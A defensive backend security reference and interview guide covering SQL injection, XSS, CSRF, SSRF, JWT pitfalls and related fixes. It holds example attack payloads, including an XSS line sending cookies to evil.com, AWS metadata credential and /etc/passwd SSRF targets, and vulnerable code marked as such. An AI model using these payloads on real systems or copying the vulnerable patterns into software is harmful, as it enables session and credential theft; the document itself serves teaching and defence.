# 🔐 Backend Security: Senior Engineer Reference (OWASP & Beyond)

**Core Philosophy:** A Junior writes code that works. A Senior writes code that an attacker cannot exploit. Security is not a feature — it is a constraint applied to every single line of code, every HTTP header, every database query, and every dependency in your `requirements.txt`.

---

## 🎯 1. SQL Injection (SQLi) — OWASP #3

### What It Is
The attacker injects raw SQL into your application's database queries by manipulating user input.

### The Attack
```python
# ❌ VULNERABLE: String concatenation
username = request.query_params["username"]
query = f"SELECT * FROM users WHERE username = '{username}'"
# Attacker sends: username = ' OR '1'='1' --
# Final query: SELECT * FROM users WHERE username = '' OR '1'='1' --'
# Result: Returns ALL users. The -- comments out the rest of the query.
```

### Advanced SQLi: Data Exfiltration
```
username = ' UNION SELECT credit_card_number, cvv FROM payments --
# The attacker piggybacks a second query onto yours and steals financial data.
```

### The Fix: Parameterized Queries (Prepared Statements)
```python
# ✅ SAFE: Parameterized query — the database treats $1 as DATA, never as SQL code
query = "SELECT * FROM users WHERE username = $1"
result = await db.fetch(query, username)
```

### Why Parameterized Queries Work
The database engine receives the query structure and the data separately. The SQL parser compiles the query plan first (`SELECT * FROM users WHERE username = ?`), then binds the user input as a literal string value. Even if the input contains `' OR '1'='1`, it's treated as a literal string to search for — not as SQL syntax.

### ORM Safety (SQLAlchemy / Django)
ORMs generate parameterized queries by default:
```python
# ✅ Safe — SQLAlchemy parameterizes automatically
user = session.query(User).filter(User.username == username).first()

# ❌ DANGEROUS — raw SQL inside ORM bypasses protection
session.execute(f"SELECT * FROM users WHERE name = '{username}'")
```

### Defense in Depth
1. **Parameterized queries** (primary defense)
2. **Least privilege DB user:** Your app's DB user should only have `SELECT`, `INSERT`, `UPDATE` on specific tables. Never `DROP`, `ALTER`, or `GRANT`.
3. **WAF (Web Application Firewall):** Catches common SQLi patterns at the network edge before they reach your application.
4. **Input validation:** Reject unexpected characters. A username should match `^[a-zA-Z0-9_]{3,30}$`.

---

## 🎯 2. Cross-Site Scripting (XSS) — OWASP #7

### What It Is
The attacker injects malicious JavaScript into your application that executes in other users' browsers.

### The Three Types

**Stored XSS (Most Dangerous):**
The attacker submits malicious JavaScript that your server saves to the database. When other users load the page, the script executes in their browser.
```
# Attacker posts a comment:
<script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>

# When any user views the comments page, their session cookie is stolen.
```

**Reflected XSS:**
The malicious script is in the URL. The server reflects it back in the response without sanitizing.
```
https://yoursite.com/search?q=<script>alert('hacked')</script>
# Server renders: "You searched for: <script>alert('hacked')</script>"
```

**DOM-Based XSS:**
The attack happens entirely in the browser — JavaScript reads from `location.hash` or `document.URL` and writes it to the DOM without sanitizing.

### Why Backend Engineers Must Care
Even though XSS executes in the browser, the **backend is responsible for preventing it**:
1. **Validate input** — restrict the *shape* of data (regex, type checks). This prevents garbage from entering your system.
2. **Encode output** — prevent *execution* of data. This ensures that even if malicious data is stored, it cannot run as code when rendered.

**These solve different problems:** Input validation catches `<script>` at the door. Output encoding neutralizes it if it somehow gets past the door. You need both.

### The Fix: Defense Layers

**1. Output Encoding (Primary Defense):**
```python
import html

# ✅ Escape HTML entities before rendering
safe_comment = html.escape(user_comment)
# "<script>alert('xss')</script>" → "&lt;script&gt;alert('xss')&lt;/script&gt;"
```

**2. Content Security Policy Header (CSP):**
CSP is one of the hardest security features to get right. A weak policy is almost useless.
```python
import secrets

@app.middleware("http")
async def add_security_headers(request, call_next):
    nonce = secrets.token_hex(16)  # Unique per request
    request.state.csp_nonce = nonce  # Pass to templates if rendering HTML
    response = await call_next(request)
    response.headers["Content-Security-Policy"] = (
        f"default-src 'self'; "
        f"script-src 'self' 'nonce-{nonce}'; "  # Only scripts with this nonce can execute
        f"style-src 'self' 'nonce-{nonce}'; "
        f"object-src 'none'; "         # Block Flash/Java plugins entirely
        f"base-uri 'self'; "           # Prevent <base> tag hijacking
        f"frame-ancestors 'none'"      # Prevent clickjacking (replaces X-Frame-Options)
    )
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["X-Frame-Options"] = "DENY"
    return response
# In HTML: <script nonce="{nonce}">...</script> — only this script runs
```

**3. HttpOnly Cookies:**
```python
response.set_cookie(
    key="session_token",
    value=token,
    httponly=True,   # JavaScript CANNOT read this cookie (defeats cookie theft XSS)
    secure=True,     # Only sent over HTTPS
    samesite="Lax",  # CSRF protection
)
```

---

## 🎯 3. Cross-Site Request Forgery (CSRF) — OWASP #5

### What It Is
The attacker tricks a logged-in user's browser into making an unwanted request to your API. The browser automatically attaches the user's cookies, so the server thinks it's a legitimate request.

### The Attack
```html
<!-- Attacker's malicious website -->
<img src="https://yourbank.com/api/transfer?to=attacker&amount=10000" />
<!-- The victim's browser loads this image tag, making a GET request with their bank cookies -->
```

Or for POST-based APIs:
```html
<form action="https://yourbank.com/api/transfer" method="POST">
    <input type="hidden" name="to" value="attacker" />
    <input type="hidden" name="amount" value="10000" />
</form>
<script>document.forms[0].submit();</script>
```

### Why APIs Are Partially Protected
If your API uses **JWT in the `Authorization` header** (not cookies), you're naturally immune to CSRF. The browser only auto-attaches cookies, not custom headers. An attacker's page cannot set the `Authorization` header on a cross-origin request.

### When CSRF Still Matters
If your API uses **cookie-based authentication** (session cookies, HttpOnly JWT cookies), CSRF is a real threat.

### The Fix: Defense Layers

**1. SameSite Cookies (Primary):**
```python
response.set_cookie(key="session", value=token, samesite="Strict")
# SameSite=Strict: Cookie is NEVER sent on cross-origin requests.
# SameSite=Lax: Cookie is sent on top-level navigations (GET) but not on POST/PUT/DELETE.
```

**2. CSRF Token (Double Submit Cookie):**
```python
import secrets

@app.get("/csrf-token")
async def get_csrf_token():
    token = secrets.token_hex(32)
    response = JSONResponse({"csrf_token": token})
    response.set_cookie("csrf_cookie", token, httponly=True, samesite="Strict")
    return response

@app.post("/transfer")
async def transfer(request: Request):
    cookie_token = request.cookies.get("csrf_cookie")
    header_token = request.headers.get("X-CSRF-Token")
    if not cookie_token or cookie_token != header_token:
        raise HTTPException(status_code=403, detail="CSRF validation failed")
    # ... proceed with transfer
```

**3. Origin/Referer Validation:**
Check that the `Origin` or `Referer` header matches your domain. If the request comes from `evil.com`, reject it.

---

## 🎯 4. Server-Side Request Forgery (SSRF) — OWASP #10

### What It Is
The attacker tricks your server into making HTTP requests to internal services that should never be publicly accessible.

### The Attack
Your API has a "Fetch URL" feature:
```python
# ❌ VULNERABLE
@app.post("/fetch-url")
async def fetch_url(url: str):
    response = await httpx.get(url)  # User controls the URL
    return response.text
```

The attacker sends:
```json
{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
```
This is the **AWS Metadata Service** — an internal-only endpoint available to every EC2 instance. The attacker just stole your AWS IAM credentials, giving them full access to your cloud infrastructure.

Other SSRF targets:
- `http://localhost:6379/` — Read/write your Redis
- `http://localhost:5432/` — Probe your Postgres
- `http://internal-admin-panel:8080/` — Access internal tools
- `file:///etc/passwd` — Read server files

### The Fix: Defense Layers

**1. URL Allowlisting (Primary):**
```python
from urllib.parse import urlparse

ALLOWED_HOSTS = {"api.stripe.com", "hooks.slack.com"}

@app.post("/fetch-url")
async def fetch_url(url: str):
    parsed = urlparse(url)
    if parsed.hostname not in ALLOWED_HOSTS:
        raise HTTPException(status_code=400, detail="URL not allowed")
    if parsed.scheme not in ("https",):
        raise HTTPException(status_code=400, detail="Only HTTPS allowed")
    response = await httpx.get(url)
    return response.text
```

**2. Block Internal IP Ranges:**
```python
import ipaddress

def is_internal_ip(hostname: str) -> bool:
    try:
        ip = ipaddress.ip_address(hostname)
        return ip.is_private or ip.is_loopback or ip.is_link_local
    except ValueError:
        return False  # Not an IP — resolve DNS and check again
```

**3. AWS IMDSv2:**
AWS now requires a PUT request with a TTL header before the metadata endpoint responds. This blocks simple SSRF GET requests.

---

## 🎯 5. Broken Authentication — OWASP #7

### Common Failures
1. **Weak password hashing:** Using MD5/SHA256 instead of bcrypt/Argon2.
2. **No rate limiting on login:** Attacker brute-forces 10,000 passwords/second.
3. **JWT in localStorage:** Stolen via XSS. Use HttpOnly cookies instead.
4. **No token expiry:** A stolen token works forever.
5. **Credential stuffing:** Attacker uses leaked password databases from other breaches.

### Production Password Hashing
```python
from passlib.context import CryptContext

pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")

# Hash on signup
hashed = pwd_context.hash("user_password")  # $2b$12$...

# Verify on login
is_valid = pwd_context.verify("user_password", hashed)  # True/False
```

**Why bcrypt, not SHA256?**
SHA256 is fast — an attacker with a GPU can hash 10 billion SHA256 passwords per second. bcrypt is intentionally slow — it takes ~100ms per hash, making brute-force attacks take centuries.

---

## 🎯 6. Broken Access Control (IDOR) — OWASP #1

### What It Is
Insecure Direct Object Reference. The attacker changes an ID in the URL to access another user's data.

### The Attack
```
GET /api/invoices/42      → Returns YOUR invoice
GET /api/invoices/43      → Returns SOMEONE ELSE'S invoice (no auth check!)
```

### The Fix: Always Verify Ownership
```python
@app.get("/invoices/{invoice_id}")
async def get_invoice(invoice_id: int, user: dict = Depends(get_current_user)):
    invoice = await db.fetch_one(
        "SELECT * FROM invoices WHERE id = $1 AND user_id = $2",
        invoice_id, user["user_id"]  # ALWAYS filter by authenticated user
    )
    if not invoice:
        raise HTTPException(status_code=404)  # 404, not 403 — don't reveal existence
    return invoice
```

**Why 404 instead of 403?** Returning `403 Forbidden` confirms the resource exists. An attacker can enumerate IDs and discover valid records. `404 Not Found` reveals nothing.

---

## 🎯 7. Mass Assignment / Over-Posting

### What It Is
The attacker sends extra fields in a request body that your code blindly passes to the database.

### The Attack
```json
// POST /api/users (signup)
{
    "username": "attacker",
    "email": "attacker@evil.com",
    "is_admin": true        // ← The attacker added this field
}
```

If your code does `User(**request.json)`, the attacker just made themselves admin.

### The Fix: Explicit Pydantic Models
```python
class UserCreate(BaseModel):
    username: str
    email: str
    # is_admin is NOT in this model — it's impossible to set via the API

class UserInDB(BaseModel):
    username: str
    email: str
    is_admin: bool = False  # Server sets this internally
```

---

## 🎯 8. Dependency Vulnerabilities (Supply Chain Attacks)

### What It Is
A package in your `requirements.txt` contains a known vulnerability. An attacker exploits it remotely.

### Real-World Example
The `event-stream` npm package was taken over by an attacker who injected cryptocurrency-stealing code. Millions of projects pulled the malicious update automatically.

### The Fix
```bash
# Scan for known vulnerabilities
pip audit                    # Python
npm audit                    # Node.js
safety check                 # Alternative Python scanner

# Pin exact versions (prevent auto-updates to malicious versions)
# requirements.txt:
fastapi==0.104.1             # Pinned, not fastapi>=0.104
uvicorn==0.24.0
```

### Automated Pipeline
Run `pip audit` in your CI/CD pipeline. If any vulnerability is found, the deploy fails automatically.

### Advanced: SBOM & Supply Chain Trust
- **SBOM (Software Bill of Materials):** A machine-readable inventory of every dependency (and transitive dependency) in your application. Tools like `cyclonedx-python` generate SBOMs. Security teams audit the SBOM to identify risk.
- **Sigstore / Provenance:** Verify that the package you're installing was actually built from the source code you expect. PyPI now supports Trusted Publishers — packages are built in GitHub Actions and signed with Sigstore, proving provenance.
- **Lock files:** Always commit `poetry.lock` or `pip-compile` output. Lock files pin transitive dependencies — without them, a sub-dependency can silently update to a malicious version.

---

## 🎯 9. Security Headers Checklist

Every production API should return these headers:

```python
@app.middleware("http")
async def security_headers(request: Request, call_next):
    response = await call_next(request)

    # Prevent XSS — only load scripts from your own domain
    response.headers["Content-Security-Policy"] = "default-src 'self'"

    # Prevent MIME-type sniffing attacks
    response.headers["X-Content-Type-Options"] = "nosniff"

    # Prevent clickjacking — block iframe embedding
    response.headers["X-Frame-Options"] = "DENY"

    # Force HTTPS for 1 year
    response.headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains"

    # Don't send referrer to external sites
    response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"

    # Disable browser features you don't use
    response.headers["Permissions-Policy"] = "geolocation=(), camera=(), microphone=()"

    return response
```

---

## 🎯 10. Secrets Management

### The Rules
1. **Never hardcode secrets** in source code. One `git push` and they're on GitHub forever (even if deleted — Git history retains them).
2. **Use environment variables** or a secrets manager (AWS Secrets Manager, HashiCorp Vault).
3. **Rotate secrets regularly.** If a key leaks, its blast radius is limited.

### FastAPI Pattern
```python
from pydantic_settings import BaseSettings

class Settings(BaseSettings):
    database_url: str
    secret_key: str
    stripe_api_key: str

    class Config:
        env_file = ".env"  # Loaded from .env, NEVER committed to git

settings = Settings()
```

### `.gitignore`
```
.env
*.pem
*.key
```

---

## 🎯 11. Rate Limiting & Brute Force Protection

### Login Endpoint Protection (Atomic with Lua)
```python
@app.post("/auth/login")
async def login(email: str, password: str, redis: Redis = Depends(get_redis)):
    fail_key = f"login_fails:{email}"

    # Atomic check + increment via Lua script (no race condition)
    check_script = """
    local failures = tonumber(redis.call('GET', KEYS[1]) or '0')
    if failures >= tonumber(ARGV[1]) then
        return -1
    end
    return failures
    """
    failures = await redis.eval(check_script, 1, fail_key, 5)

    if failures == -1:
        raise HTTPException(
            status_code=429,
            detail="Account temporarily locked. Try again in 15 minutes."
        )

    user = await authenticate(email, password)
    if not user:
        # Atomic increment + set expiry
        incr_script = """
        local c = redis.call('INCR', KEYS[1])
        if c == 1 then
            redis.call('EXPIRE', KEYS[1], ARGV[1])
        end
        return c
        """
        await redis.eval(incr_script, 1, fail_key, 900)
        raise HTTPException(status_code=401, detail="Invalid credentials")

    # Reset on success
    await redis.delete(fail_key)
    return {"token": create_jwt(user)}
```

---

## 🎯 12. CORS (Cross-Origin Resource Sharing)

### What It Is
Browsers block frontend JavaScript (running on `app.example.com`) from making requests to a different domain (`api.example.com`). CORS headers tell the browser which origins are allowed.

### FastAPI Configuration
```python
from fastapi.middleware.cors import CORSMiddleware

app.add_middleware(
    CORSMiddleware,
    allow_origins=["https://app.example.com"],  # ❌ NEVER use ["*"] in production
    allow_credentials=True,
    allow_methods=["GET", "POST", "PUT", "DELETE"],
    allow_headers=["Authorization", "Content-Type"],
)
```

### The `*` Trap
`allow_origins=["*"]` means any website can make requests to your API. If your API uses cookies, the attacker's site can make authenticated requests on behalf of logged-in users. Always whitelist specific origins.

---

## 🎙️ Elite Interview Q&A

### QA 1: Your application uses an ORM (SQLAlchemy). A junior developer says "ORMs prevent SQL injection, so we don't need to worry." Is this correct?
**The Senior Answer:**
"Partially correct, but dangerously overconfident. ORMs generate parameterized queries by default, which prevents SQLi for standard operations like `session.query(User).filter_by(name=input)`. However, ORMs also provide raw SQL escape hatches: `session.execute(text(f"SELECT * FROM users WHERE name = '{input}'"))`. If the developer uses string interpolation inside `text()`, the ORM provides zero protection. Additionally, some ORM methods accept `order_by` clauses that can be injected if built from user input. The rule is: the ORM protects you only when you use it correctly."

***

### QA 2: You discover that your API returns `403 Forbidden` when a user tries to access another user's invoice. Why is this a security vulnerability?
**The Senior Answer:**
"Returning `403` confirms that the resource exists. An attacker can enumerate IDs (`/invoices/1`, `/invoices/2`, ...) and build a map of all valid invoice IDs. Even without accessing the data, this information leakage is valuable — they know the approximate number of customers, invoice frequency, and ID patterns. The fix is to return `404 Not Found` for any resource the user doesn't own. The attacker cannot distinguish 'doesn't exist' from 'exists but I can't access it.'"

***

### QA 3: An attacker finds your API's `/fetch-url` endpoint and sends `url=http://169.254.169.254/latest/meta-data/`. What are they trying to do, and how do you prevent it?
**The Senior Answer:**
"This is an SSRF attack targeting the AWS EC2 Instance Metadata Service (IMDS). The `169.254.169.254` IP is internal to every EC2 instance and exposes IAM credentials, security group configurations, and instance identity. If my API fetches this URL server-side, the attacker receives my AWS credentials and can access my entire cloud infrastructure.
**Prevention:** (1) Allowlist: Only permit requests to known external domains. (2) Block private IP ranges (`10.x`, `172.16.x`, `192.168.x`, `169.254.x`). (3) Enable AWS IMDSv2 which requires a PUT request with a hop-limit header, blocking simple GET-based SSRF. (4) DNS rebinding protection — resolve the hostname, verify the IP is public, then make the request."

***

### QA 4: What is the difference between encryption, hashing, and encoding?
**The Senior Answer:**
"**Encoding** (Base64, URL encoding) transforms data into a different format for transport. It is NOT security — anyone can decode it. Never use encoding to 'protect' data.
**Encryption** (AES, RSA) transforms data into ciphertext using a secret key. It is reversible — with the correct key, you can decrypt and recover the original data. Used for: data at rest, data in transit (TLS).
**Hashing** (bcrypt, SHA256) transforms data into a fixed-length fingerprint. It is irreversible — you cannot recover the original data from the hash. Used for: password storage. You hash the password on signup, and on login you hash the input and compare hashes."

***

### QA 5: Your API accepts file uploads. What are the security risks?
**The Senior Answer:**
"File uploads are one of the most dangerous features:
1. **Path traversal:** Filename `../../etc/cron.d/malicious` could overwrite system files. Fix: Generate a random filename server-side, never use the client's filename.
2. **Executable uploads:** Attacker uploads a `.php` or `.py` file. If your web server executes it, they have remote code execution. Fix: Store uploads outside the web root. Validate MIME type by reading file magic bytes, not trusting the `Content-Type` header.
3. **Zip bombs:** A 42KB zip file that expands to 4.5 petabytes of data, crashing your server. Fix: Set strict file size limits (`client_max_body_size` in Nginx) and limit decompression.
4. **XSS via SVG/HTML:** An SVG file containing `<script>` tags. Fix: Serve uploaded files with `Content-Disposition: attachment` and `X-Content-Type-Options: nosniff`."

***

### QA 6: What is the OWASP Top 10, and can you name the current top 3?
**The Senior Answer:**
"OWASP (Open Web Application Security Project) publishes the Top 10 most critical web application security risks, updated every 3-4 years. The 2021 edition:
1. **Broken Access Control (A01):** Users can act outside their intended permissions — IDOR, privilege escalation, missing auth checks.
2. **Cryptographic Failures (A02):** Weak hashing (MD5), unencrypted data in transit, hardcoded secrets.
3. **Injection (A03):** SQL injection, NoSQL injection, OS command injection, LDAP injection.
I reference the OWASP Top 10 during code reviews as a checklist, and I integrate OWASP ZAP (automated scanner) into our CI/CD pipeline."

***

### QA 7: Your JWT uses `HS256` algorithm. An attacker changes the JWT header to `alg: "none"` and removes the signature. Your server accepts it as valid. What happened?
**The Senior Answer:**
"This is the `alg: none` attack. Some JWT libraries, when configured carelessly, accept `none` as a valid algorithm — meaning no signature verification is performed. The attacker can forge any JWT payload (make themselves admin) with zero cryptographic knowledge.
**The Fix:** Always explicitly specify the allowed algorithms when verifying: `jwt.decode(token, SECRET_KEY, algorithms=['HS256'])`. Never allow the JWT header itself to dictate which algorithm to use. Additionally, consider using `RS256` (asymmetric keys) instead of `HS256` (symmetric) — with RS256, even if the public key leaks, tokens cannot be forged without the private key."

***

### QA 8: What is the difference between authentication and authorization? Give a real-world analogy.
**The Senior Answer:**
"**Authentication** = proving WHO you are. Showing your ID at the airport security checkpoint.
**Authorization** = proving WHAT you can do. Having a boarding pass for a specific flight. You passed security (authenticated), but you can only board YOUR flight (authorized).
In code: authentication verifies the JWT signature and extracts the user identity. Authorization checks whether that user's role permits the requested action (e.g., only admins can `DELETE /users`)."

***

### QA 9: How do you securely store API keys that your backend needs to call third-party services (Stripe, SendGrid)?
**The Senior Answer:**
"The hierarchy of security, from worst to best:
1. ❌ Hardcoded in source code — leaked via Git history, visible to all developers.
2. ⚠️ `.env` file — better, but still a plaintext file on the server's filesystem.
3. ✅ Environment variables injected at deploy time (Docker secrets, Kubernetes secrets) — never written to disk.
4. ✅✅ Secrets Manager (AWS Secrets Manager, HashiCorp Vault) — encrypted at rest, access-logged, automatically rotated, with IAM-based access control.
In production, I use a Secrets Manager. The application fetches secrets at startup via an IAM-authenticated API call. The secrets never exist in the codebase, in environment variables, or on the filesystem."

***

### QA 10: What is a Timing Attack, and how does it apply to password comparison?
**The Senior Answer:**
"When comparing two strings character by character, Python's `==` operator short-circuits — it returns `False` the moment it finds the first mismatching character. If the first character is wrong, the comparison takes 1μs. If the first 10 characters are correct, it takes 10μs. An attacker can measure this time difference across thousands of requests to brute-force the correct string one character at a time.
**The Fix:** Use `hmac.compare_digest(a, b)` which always takes the same amount of time regardless of how many characters match. This is called constant-time comparison. All password hashing libraries (bcrypt, Argon2) use this internally, but when comparing API keys or CSRF tokens manually, you must use `hmac.compare_digest`."

---

## 🎯 13. JWT Storage: The Real Trade-Off

### The Incomplete Advice
"Store JWT in HttpOnly cookies, not localStorage." This is half the answer.

### The Full Picture
| Storage | Vulnerable To | Protected From |
|---|---|---|
| `localStorage` | XSS (JavaScript can read it) | CSRF (not auto-attached) |
| `HttpOnly Cookie` | CSRF (auto-attached by browser) | XSS (JavaScript can't read it) |

### The Senior Answer
"The correct choice depends on your threat model:
- **If you have strong CSP headers** (blocking inline scripts) → HttpOnly cookies are safer because XSS is mitigated at the header level, and CSRF is handled by SameSite cookies.
- **If your API is pure JSON** (no cookie auth) → `Authorization: Bearer` header with tokens in memory (JavaScript variable, not localStorage). Tokens are lost on page refresh but immune to both XSS-based theft and CSRF.
- **Production standard:** Short-lived access token in memory (JavaScript variable) + long-lived refresh token in HttpOnly, Secure, SameSite=Strict cookie."

---

## 🎯 14. Session Fixation Attack

### What It Is
The attacker sets the session ID on the victim's browser *before* the victim logs in. After login, the server associates the attacker's known session ID with the victim's authenticated session.

### The Attack Flow
1. Attacker visits your site, gets session ID `abc123`.
2. Attacker tricks victim into using `abc123` (via URL parameter or cookie injection).
3. Victim logs in. Server now associates `abc123` with the victim's account.
4. Attacker uses `abc123` — they're now logged in as the victim.

### The Fix
**Regenerate the session ID after every authentication event:**
```python
@app.post("/auth/login")
async def login(email: str, password: str, request: Request):
    user = await authenticate(email, password)
    if not user:
        raise HTTPException(status_code=401)

    # CRITICAL: Generate a NEW session token on login
    # Never reuse the pre-authentication session ID
    new_session_id = secrets.token_hex(32)
    await redis.set(f"session:{new_session_id}", json.dumps({"user_id": user.id}), ex=3600)

    response = JSONResponse({"status": "authenticated"})
    response.set_cookie("session", new_session_id, httponly=True, secure=True, samesite="Strict")
    return response
```

---

## 🎯 15. SSRF: DNS Rebinding (The Advanced Attack)

### Why Simple URL Validation Fails
Your SSRF protection checks `urlparse(url).hostname` and blocks private IPs. The attacker bypasses it:

1. Attacker controls `evil.com` DNS.
2. First DNS resolution: `evil.com → 1.2.3.4` (public IP — passes your check).
3. Your server validates the IP, says "OK, it's public."
4. **Between validation and the actual HTTP request**, the DNS TTL expires.
5. Second DNS resolution: `evil.com → 127.0.0.1` (localhost).
6. Your server makes the HTTP request to `127.0.0.1` — SSRF achieved.

### The Fix: Resolve-Then-Verify-Then-Lock
```python
import socket
import ipaddress

async def safe_fetch(url: str):
    parsed = urlparse(url)

    # Step 1: Resolve DNS ourselves
    ip = socket.gethostbyname(parsed.hostname)

    # Step 2: Verify the resolved IP is public
    addr = ipaddress.ip_address(ip)
    if addr.is_private or addr.is_loopback or addr.is_link_local or addr.is_reserved:
        raise HTTPException(status_code=400, detail="Internal IPs blocked")

    # Step 3: Make the request using the resolved IP directly (bypasses DNS rebinding)
    async with httpx.AsyncClient() as client:
        response = await client.get(
            f"{parsed.scheme}://{ip}{parsed.path}",
            headers={"Host": parsed.hostname},  # Preserve original Host header
        )
    return response.text
```

---

## 🎯 16. Password Hashing: bcrypt vs Argon2

### bcrypt (Industry Standard)
- Time-cost only (how many rounds of hashing).
- GPU-resistant because it requires 4KB of RAM per hash (too much for GPU cache).
- Well-proven, supported everywhere.

### Argon2 (Modern Standard — Winner of Password Hashing Competition 2015)
- **Memory-hard:** Configurable memory cost (e.g., 64MB per hash). GPUs and ASICs cannot parallelize it because each hash requires dedicated RAM.
- **Parallelism-aware:** Configurable thread count.
- Three variants: Argon2d (GPU-resistant), Argon2i (side-channel-resistant), **Argon2id** (recommended — hybrid).

```python
from argon2 import PasswordHasher

ph = PasswordHasher(
    time_cost=3,        # Number of iterations
    memory_cost=65536,  # 64MB of RAM per hash
    parallelism=2,      # 2 threads
)

# Hash
hashed = ph.hash("user_password")
# $argon2id$v=19$m=65536,t=3,p=2$...

# Verify
try:
    ph.verify(hashed, "user_password")  # Returns True or raises exception
except argon2.exceptions.VerifyMismatchError:
    print("Wrong password")
```

### Senior Recommendation
"For new projects, I use Argon2id. For existing projects already using bcrypt, migrating isn't worth the effort — bcrypt is still secure. The key is that both are *slow by design*, which is the entire point."

---

## 🎯 17. Security Logging & Audit Trail

Prevention is half the battle. **Detection** is the other half.

### What To Log
```python
import structlog

logger = structlog.get_logger()

@app.post("/auth/login")
async def login(email: str, password: str, request: Request):
    user = await authenticate(email, password)

    if not user:
        # ⚠️ Log failed login with context for anomaly detection
        logger.warning("login_failed",
            email=email,
            ip=request.client.host,
            user_agent=request.headers.get("user-agent"),
            geo=geoip_lookup(request.client.host),
        )
        raise HTTPException(status_code=401)

    # ✅ Log successful login
    logger.info("login_success",
        user_id=user.id,
        ip=request.client.host,
    )
```

### What Triggers An Alert
| Event | Why It's Suspicious |
|---|---|
| 50 failed logins for same email in 1 minute | Brute force attack |
| Successful login from 2 countries within 1 hour | Impossible travel (stolen credential) |
| Admin endpoint accessed by non-admin user | Privilege escalation attempt |
| Burst of 404s on sequential `/users/1`, `/users/2`... | IDOR enumeration |
| Unusual User-Agent (`python-requests`, `curl`) on a web-only app | Automated scraping / attack tool |

### Audit Trail for Sensitive Operations
Every mutation on sensitive data must be logged immutably:
```python
async def transfer_funds(from_id: int, to_id: int, amount: float, user: dict):
    await db.execute("INSERT INTO audit_log (action, actor_id, details, ip, timestamp) VALUES ($1,$2,$3,$4,NOW())",
        "FUND_TRANSFER",
        user["user_id"],
        json.dumps({"from": from_id, "to": to_id, "amount": amount}),
        user["ip"],
    )
    # ... perform transfer
```

### SIEM Integration
In production, logs are shipped to a **SIEM** (Security Information and Event Management) system — Splunk, Datadog Security, or ELK Stack with alerting rules. The SIEM correlates events across services and triggers alerts when patterns emerge.

---

## 🎯 18. Zero Trust Architecture

### The Principle
**Never trust, always verify.** Even requests originating from inside your private network are treated as potentially hostile.

### Why It Matters
Traditional security: "Everything inside the VPC is trusted." If an attacker compromises one service inside the network, they have unrestricted lateral movement to every other service.

### Zero Trust Rules
1. **Every service authenticates every request** — even internal service-to-service calls. mTLS (mutual TLS) or signed JWTs for inter-service communication.
2. **Least privilege:** Each service only has access to the specific resources it needs. A payment service cannot query the user service's database directly.
3. **Encrypt everything:** TLS everywhere, even inside the private network. An attacker with network access cannot sniff traffic.
4. **Verify continuously:** Don't just authenticate at the edge. Re-validate permissions at every service boundary.

---

## 🎯 19. Replay Attack Prevention

### What It Is
An attacker captures a legitimate API request (e.g., a payment) and re-sends it later to duplicate the action.

### Defense: Nonce + Timestamp + Idempotency
```python
@app.post("/transfer")
async def transfer(
    request: Request,
    nonce: str = Header(...),          # Unique per request
    timestamp: int = Header(...),      # Unix epoch seconds
    redis: Redis = Depends(get_redis),
):
    # 1. Reject stale requests (older than 5 minutes)
    now = int(time.time())
    if abs(now - timestamp) > 300:
        raise HTTPException(status_code=400, detail="Request expired")

    # 2. Reject replayed nonces
    nonce_key = f"nonce:{nonce}"
    already_used = await redis.set(nonce_key, "1", nx=True, ex=600)
    if not already_used:
        raise HTTPException(status_code=409, detail="Duplicate request (replay detected)")

    # 3. Process the transfer
    return await process_transfer(request)
```

---

## 🎙️ Elite QA Extensions (Staff-Level)

### QA 11: How do you secure internal microservice-to-microservice communication?
**The Senior Answer:**
"Internal traffic is not inherently trusted (Zero Trust). I use one of two patterns:
1. **mTLS (Mutual TLS):** Both the client service and the server service present X.509 certificates. The server verifies the client's certificate against a trusted CA. This provides authentication (identity) and encryption (confidentiality) at the transport layer. Service meshes like Istio or Linkerd automate mTLS between all pods.
2. **Signed JWTs for Service Identity:** Each service has its own signing key. When Service A calls Service B, it includes a JWT with `iss: 'payment-service'` and `aud: 'user-service'`. Service B verifies the signature and checks the issuer before processing. This provides application-level identity without the infrastructure overhead of mTLS."

***

### QA 12: Your Stripe API key is compromised. Walk me through your incident response.
**The Senior Answer:**
"Immediate actions (within 5 minutes):
1. **Rotate the key:** Generate a new API key in the Stripe dashboard. The old key is instantly invalidated.
2. **Deploy the new key:** Push the new key to your Secrets Manager. All running services pick it up on the next config refresh.
3. **Audit blast radius:** Check Stripe's API logs for unauthorized charges, customer data access, or webhook modifications since the key was leaked.
4. **Find the leak source:** Search Git history (`git log -p | grep stripe_key`), CI/CD logs, and error reporting tools. Determine if it was committed to code, logged in plaintext, or leaked via a compromised server.
5. **Post-mortem:** Implement guardrails — pre-commit hooks that scan for secrets (`detect-secrets`), key rotation automation, and restricted key scopes (Stripe allows read-only keys)."

***

### QA 13: What happens if your Redis instance is compromised? How do you minimize damage?
**The Senior Answer:**
"Redis should never contain sensitive data that can be exploited in isolation:
1. **No plaintext passwords or API keys** in cache — only hashed session tokens and transient data.
2. **Network isolation:** Redis should only be accessible from application containers on a private subnet. Never exposed to the public internet. Bind to `127.0.0.1` or a private VPC IP.
3. **Authentication:** Enable `requirepass` in Redis. Even internal services must authenticate.
4. **Encryption at rest:** Enable Redis TLS for data in transit. Use encrypted EBS volumes for RDB/AOF persistence.
5. **Blast radius:** If Redis only contains cache data (not primary storage), the worst case is a cache invalidation — the application falls back to the database. If Redis stores sessions, rotate all session tokens immediately, forcing all users to re-authenticate."

***

### QA 14: How do you detect an ongoing intrusion that has bypassed your prevention layer?
**The Senior Answer:**
"Detection requires three layers:
1. **Structured Logging:** Every authentication event, authorization failure, and data mutation is logged in structured JSON format with user ID, IP, timestamp, and user-agent. Logs are shipped to a SIEM (Datadog, Splunk, ELK).
2. **Anomaly Alerting:** The SIEM fires alerts on: impossible travel (login from two continents within 1 hour), brute-force patterns (50+ failed logins per minute), privilege escalation attempts (non-admin hitting admin endpoints), and unusual data access volume (one user downloading 10,000 records).
3. **Honeypots:** I deploy internal endpoints like `/admin/debug` that have no legitimate use. Any request to them is an automatic red alert — someone is probing."

***

### QA 15: An interviewer asks: "Your API uses JWT with HttpOnly cookies. A junior says 'we don't need CSRF protection because we use JWT.' Is this correct?"
**The Senior Answer:**
"Absolutely wrong. The JWT storage location determines the attack surface, not the token format:
- If the JWT is in an `Authorization` header (managed by JavaScript), CSRF is not possible — the browser never auto-attaches custom headers cross-origin.
